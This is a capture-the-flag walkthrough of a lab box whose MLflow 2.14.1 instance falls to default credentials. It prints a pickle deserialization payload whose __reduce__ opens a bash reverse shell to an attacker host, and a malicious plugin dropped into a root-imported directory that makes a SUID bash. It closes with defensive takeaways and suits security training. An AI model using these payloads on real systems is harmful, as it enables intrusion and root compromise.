SmartHire

MediumLinux

SmartHire is a Medium-difficulty Linux box that demonstrates exactly how dangerous outdated MLOps infrastructure can be. An AI-first hiring platform exposes a stale MLflow 2.14.1 instance on a hidden vhost; a default-credential authentication bypass opens the door, and a carefully mocked Pickle deserialization payload turns the platform's “Analyze Resume” feature into remote code execution. Root comes from a writable plugin directory abused by a root-run management script.

PHASE 1

Reconnaissance & Virtual Host Discovery

Rustscan for speed on the initial sweep, then a full nmap pass for service detail with rate controls tuned to stay under IDS thresholds — a habit worth keeping even in a lab, since it mirrors how a real engagement has to behave.

Fast port discovery

WhyRustscan's async scanner finds open ports quickly, then automatically hands off to nmap for full service/version fingerprinting on just those ports — far faster than running nmap's own full-range scan from scratch.

rustscan -a [TARGET_IP] -- -A -oA smarthire
Open [TARGET_IP]:22
Open [TARGET_IP]:80

NextOnly SSH and HTTP are open, so the HTTP service is the entire attack surface. Resolve the hostname the redirect is pointing at.

Controlled-rate detailed scan

Why--min-rate / --max-rate keep packet throughput predictable — a habit that matters outside the lab where aggressive scanning can trip IDS/IPS thresholds or degrade a production network.

nmap -vvv -p22,80 -A [TARGET_IP]

PHASE 2

Application Analysis

Two separate surfaces to understand: the main SmartHire dashboard (CSV-driven model training/prediction), and the models subdomain, which turns out to be a full MLflow deployment.

Register and explore the main dashboard

WhySelf-registration is open, so creating an account gives full visibility into the “Train Model” and “Make Predictions” features — both of which accept CSV uploads describing candidate data, and both of which call out to the ML backend under the hood.

NextFingerprint the models.smarthire.htb subdomain before deciding which feature to target.

Fingerprint the models subdomain

WhyThe 401 response and page structure identify this as an MLflow instance — the open-source ML lifecycle platform used for experiment tracking and model registry.

NextCheck the running version against known MLflow CVEs; older MLflow releases have a long history of authentication and deserialization issues.

CVE-2026-2635 — MLflow Authentication Bypass

MLflow 2.14.1 is vulnerable to an authentication bypass using the stock default credentials admin:password. Those creds granted immediate access to the MLflow UI, confirming the instance had never been reconfigured from its default state — a strong signal that this is the intended entry point.

PHASE 4

Pickle Deserialization RCE — Mocking the Expected Model Structure

The dashboard's Make Predictions feature fetches a registered MLflow model and deserializes it with Pickle to run inference. That deserialization step is the vulnerability: Pickle executes arbitrary code on load if the object graph contains a __reduce__ method, which is exactly what CVE-2024-37054/CVE-2024-37055-class MLflow RCE abuses.

Reverse the expected model structure

WhyPulling a legitimate python_model.pkl and inspecting it with unpickle.py / pickletools showed the real application expects a specific local module path: utils/simplehiringmodel.py defining a SimpleHiringModel class. The malicious model has to satisfy this exact import path or the app's loader will fail before the payload ever runs.

NextReplicate that module structure locally (or spoof it at the Python module-registry level) so a crafted model can be serialized under the expected name.

Build the Python environment

WhyMatching dependency versions matters a lot here — Pickle payloads are fragile across library versions, and getting this wrong was the single biggest time sink during exploitation.

sudo pacman -Syu libxcrypt-compat
uv venv .venv --python 3.10.12
source ./.venv/bin/activate
uv pip install "mlflow<=2.14.1" "cloudpickle==3.1.1" "setuptools<82"

NextWrite the exploit script that spoofs the utils.simplehiringmodel module and embeds the reverse-shell payload inside a class whose __reduce__ method fires on unpickle.

Craft the malicious model class

WhyThe payload class's __reduce__ method is the actual trigger — it returns a tuple of (callable, args) that Pickle invokes automatically during deserialization, well before any legitimate predict() call. The module path is spoofed at the sys.modules level so cloudpickle serializes it under the name the target app already trusts.

class SimpleHiringModel(mlflow.pyfunc.PythonModel):
    def __init__(self):
        class CommandRunner:
            def __reduce__(self):
                cmd = f"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'"
                return (os.system, (cmd,))
        self.payload = CommandRunner()

    def predict(self, context, model_input):
        return "Let the pwn commence."

SimpleHiringModel.__module__ = "utils.simplehiringmodel"

NextLog and register this malicious model against the target MLflow tracking server using the admin:password credentials recovered earlier.

Register the malicious model

WhyUsing the MLflow Python client against the real tracking URI logs the poisoned artifact and registers it under a new model name — exactly the workflow a legitimate data scientist would use, which is what makes this attack so hard to spot from the app's perspective.

python3 exploit.py -t http://models.smarthire.htb -m evil-model -u admin -p password -lh <LHOST> -lp 4444
[*] Model artifacts logged safely.
[*] Registering model under name 'evil-model'...
[*] Model deployment and registration completed.

NextStart a listener, then trigger the application to actually load and deserialize this registered model.

Trigger the deserialization via Make Predictions

WhyThe main SmartHire app's Analyze Resume button fetches whatever model is currently registered and deserializes it server-side to run inference against the uploaded CSV. Since Pickle executes on load — not on predict() — simply triggering this feature with the malicious model active is enough to fire the payload.

PHASE 5

Privilege Escalation — Sudo-Scoped Plugin Loader Hijack

User enumeration found a SQLite database with an admin password hash that turned out to be a deliberate red herring — uncrackable in reasonable time. The real path was a sudo rule combined with an insecurely permissioned plugin directory.

Red herring: smarthire.db

A SCRYPT-format administrator hash was recovered from a local SQLite database. After manual reformatting for Hashcat/John, it still didn't crack in a reasonable timeframe — a reminder not to sink unlimited time into a hash that resists cracking; check sudo rights and file permissions in parallel rather than treating cracking as the only path forward.

Enumerate sudo rights

Whysvcweb can run a specific management script as root without a password — the script's own behavior, not raw sudo access, is what needs to be abused here.

sudo -l
User svcweb may run the following commands on smarthire:
(root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *

NextRead the script (or infer its behavior from its directory layout) to understand how it loads its functionality.

Inspect the plugin loader's directory permissions

Whymlflowctl.py dynamically imports Python files from a plugins directory on every invocation. The top-level plugins directory is root-owned and read-only to others — but a subdirectory inside it, plugins/dev/, is group-writable by devs, a group svcweb belongs to.

ls -la /opt/tools/mlflow_ctl/plugins
drwxr-xr-x 4 root root 4096 core
drwxrwxr-x 2 root devs 4096 dev   &larr; writable by svcweb's group

NextAny Python file dropped into plugins/dev/ gets blindly imported and executed the next time the root-run script is invoked — that's the entire privilege-escalation primitive.

Drop a malicious plugin module

WhyThe payload runs at import time (not inside any specific function), so simply placing the file is enough — no need to wait for a particular command-line action to invoke it.

cat << 'EOF' > /opt/tools/mlflow_ctl/plugins/dev/mlflow_actions.py
import os, sys
os.system("cp /bin/bash /tmp/rootbash && chmod +xs /tmp/rootbash")
print("[+] Exploit successful! Run /tmp/rootbash -p for root access.")
sys.exit(0)
EOF

NextInvoke the sudo-permitted script to force the plugin loader to import the new file.

Trigger the root-run script

WhyRunning the script through the exact sudo rule granted (no password required) causes it to import every file under plugins/dev/, including the malicious one just dropped in — executing it as root in the process.

sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status

NextA SUID bash binary should now exist at /tmp/rootbash.

Spawn the root shell

Why-p preserves the effective privileges granted by the SUID bit, which bash otherwise drops by default for safety.

/tmp/rootbash -p
rootbash-5.2# whoami
root

NextGrab root.txt to close out the box.

Key Takeaways

  • MLOps platforms (MLflow, model registries, pipeline orchestrators) are first-class application targets — they deserve the same patch cadence and default-credential hygiene as any internet-facing web app, not the looser standard they often get as "internal tooling."
  • Pickle (and anything built on it, including cloudpickle) should never be used to deserialize untrusted or externally-registrable model artifacts; prefer safer serialization formats (ONNX, SafeTensors) for any model a lower-trust user can register.
  • A sudo rule scoped to a specific script is only as safe as that script’s own file-handling logic — a root-run script that dynamically imports from a group-writable directory is functionally equivalent to granting that group unrestricted sudo.
  • An uncrackable hash is a signal to pivot, not a wall to keep hammering — red herrings exist precisely to waste attacker (and defender-reviewer) time; always check sudo rights and file permissions as parallel tracks.
